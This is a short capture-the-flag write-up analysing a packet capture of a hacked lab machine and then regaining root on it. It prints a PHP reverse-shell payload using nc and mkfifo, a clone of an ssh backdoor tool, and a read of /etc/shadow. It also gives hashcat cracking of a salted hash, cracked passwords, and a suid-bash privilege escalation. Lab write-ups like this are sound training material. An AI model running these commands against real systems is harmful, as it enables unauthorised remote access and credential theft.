# Overpass 2 Hacked

An analysis of the wireshark data of a hacked computer

You can quickly see that an IP of `192.168.170.145` uploads `payload.php`

In the packet analysis you can see that it has a php payload in it
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
which is standard code for a reverse shell

They then explore the directories and su into james
```
whenevernoteartinstant
```

Checks his sudo permissions and has permission to sudo anything

After which they git clone a persistence module
```
git clone https://github.com/NinjaJc01/ssh-backdoor
```

Now they `sudo cat /etc/shadow`

We can see that there are several weak hashes (cracked by john using the fast track wordlist)

they also generate an ssh key `id_rsa`

---
 
Analysing the code we can see that it takes a hash as an input and uses a hardcoded salt

`bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` is the default hash
`1c362db832f3f864c8c2fe05f2002a05` hardcoded salt
`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed` user hash

crack the hash using hashcat mode 1710 in the format `hash:salt` with the rockyou wordlist

Cracked the password:
`november16`

---

Hacking back into the machine

IP=`10.10.42.43`

Had to use port 2222 to ssh in through the backdoor

sudo passwords were changed

noticed a .suid_bash file in james home directory
decided to run that with -p
got root access

Got both flags!
